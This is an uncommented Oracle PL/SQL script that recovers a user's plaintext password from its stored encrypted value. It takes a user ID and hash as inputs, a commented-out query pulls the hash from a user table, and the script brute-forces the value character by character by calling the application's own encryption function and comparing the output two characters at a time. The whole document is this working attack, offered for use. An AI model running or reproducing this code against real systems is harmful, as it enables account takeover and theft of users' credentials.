--CREATE TABLE P(p VARCHAR2(100));
SET VERIFY OFF
DECLARE
--d	VARCHAR2(3000) := 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890@/°§!"#$%_()?¨^*´`<>?=-:.,;';
d	VARCHAR2(3000) := 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890~!@#$%^&*()+=-`[{]}\|''":;/?.>,<';
u	VARCHAR2(100);
e	VARCHAR2(100);
t	VARCHAR2(100);
s	VARCHAR2(100);
c	VARCHAR2(100);
f	VARCHAR2(100);
g	VARCHAR2(100);
l	NUMBER;
n	NUMBER;
k	NUMBER := 0;
h	NUMBER;
CC NUMBER;
CURSOR v
IS
SELECT	p
FROM	P
WHERE	LENGTH(p) = n-1;
BEGIN
	DELETE P;
	s := '&USERID';
	IF h < 1 THEN
		h := 10;
	END IF;
        u := '&PWD';
	 /*
	SELECT	user_password
	INTO	u
	FROM	SMTB_USER
	WHERE	user_id = s;
	 */
	SELECT	INSTR(u,'0F',1,1)
	INTO	l
	FROM	DUAL;
	l := (l-1)/2;
	n := 1;
	FOR i IN 1 .. LENGTH(d)
	LOOP
		f := SUBSTR(d,i,1);
		c := RPAD(f,l,'A');
		t := SMPKS.fn_encrypt_password(c,s);
		IF SUBSTR(t,n,2) = SUBSTR(u,n,2)
		THEN
			INSERT INTO P VALUES (f);
		END IF;
	END LOOP;
	FOR x IN 1 .. l-1 LOOP
	--FOR x IN 1..5 LOOP
		n := n+1;
 		CC := 0;
		FOR y IN v
		LOOP
			f := y.p;
			FOR i IN 1 .. LENGTH(d)
			LOOP
				g := f||SUBSTR(d,i,1);
				c := RPAD(g,l,'A');
				t := SMPKS.fn_encrypt_password(c,s);
				IF SUBSTR(t,n*2-1,2) = SUBSTR(u,n*2-1,2)
				THEN
					INSERT INTO P VALUES (g);
					COMMIT;
					CC := CC + 1;
					IF LENGTH(g) = l
					THEN
						k := k + 1;
					END IF;
					IF CC > 2 
					THEN 
					EXIT;
					END IF;
					DBMS_OUTPUT.PUT_LINE(H||' '||K);
				END IF;
			END LOOP;
			COMMIT;
		END LOOP;
	END LOOP;
	DELETE P WHERE LENGTH(p) <> l;
END;
/
select * From p;
SET VERIFY ON
